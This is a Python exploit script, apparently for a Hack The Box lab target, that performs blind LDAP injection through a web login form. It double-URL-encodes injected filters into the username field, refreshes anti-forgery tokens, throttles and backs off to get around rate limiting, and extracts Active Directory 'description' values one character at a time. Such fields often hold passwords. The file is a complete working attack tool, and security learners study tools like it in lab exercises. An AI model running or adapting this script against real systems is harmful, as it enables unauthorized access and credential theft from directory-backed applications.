#!/usr/bin/env python3
"""
Extract LDAP 'description' values through the blind injection oracle
(Hercules / HTB).

Injection: username = '<prefix>*' with a condition appended, e.g.
   *)(description=Pa*
which becomes (&(sAMAccountName=*)(description=Pa*)(...base conditions...))
"""
import re
import sys
import time
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

LOGIN = "https://10.129.242.196/Login"
S = requests.Session()
S.verify = False
_tok = {"v": None, "t": 0.0}
_last = [0.0]
GAP = 1.55
COUNT = [0]


def dbl(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def token():
    if _tok["v"] and time.time() - _tok["t"] < 100:
        return _tok["v"]
    r = S.get(LOGIN, timeout=15)
    _tok["v"] = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text).group(1)
    _tok["t"] = time.time()
    return _tok["v"]


def post(injection):
    for _ in range(8):
        d = _last[0] - time.time()
        if d > 0:
            time.sleep(d)
        _last[0] = time.time() + GAP
        body = (f"Username={dbl(injection)}&Password=x&RememberMe=false"
                f"&__RequestVerificationToken={token()}")
        r = S.post(LOGIN, data=body.encode(),
                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                   timeout=20)
        COUNT[0] += 1
        if r.status_code == 429:
            _tok["v"] = None
            print(f"    [429 @ req#{COUNT[0]}] sleeping 33s", flush=True)
            time.sleep(33)
            _last[0] = time.time() + GAP
            continue
        if len(r.text) == 3213 and "Invalid login attempt" not in r.text:
            _tok["v"] = None
            continue
        return r.text
    return ""


def test(inj):
    """True = >=1 match (condition holds)."""
    return "Login attempt failed" in post(inj)


def initial_probe():
    print("=== which first characters exist in any description ===", flush=True)
    hits = []
    for c in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        if test(f"*)(description={c}*"):
            hits.append(c)
            print(f"  initial '{c}' -> HIT (req#{COUNT[0]})", flush=True)
    print("initials found:", hits, flush=True)
    return hits


CHARSET = ("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
           "_-!@#$%^&*+=.,?/|~ ")


def extract(initial, maxlen=40):
    val = initial
    while len(val) < maxlen:
        hit = None
        for c in CHARSET:
            if test(f"*)(description={val}{c}*"):
                hit = c
                break
        if hit is None:
            break
        val += hit
        print(f"  value so far: {val!r}  (req#{COUNT[0]})", flush=True)
    # confirm exact end
    exact = test(f"*)(&(description={val})(sAMAccountName=*")
    print(f"  exact-match confirm '{val}': {exact} (req#{COUNT[0]})", flush=True)
    return val


if __name__ == "__main__":
    t0 = time.time()
    inits = initial_probe()
    results = []
    for i in inits[:4]:
        print(f"=== extracting description starting with '{i}' ===", flush=True)
        v = extract(i)
        results.append(v)
        print(f"  DONE: {v!r}", flush=True)
    print(f"\nall extracted: {results}", flush=True)
    print(f"elapsed {time.time()-t0:.0f}s, {COUNT[0]} requests", flush=True)
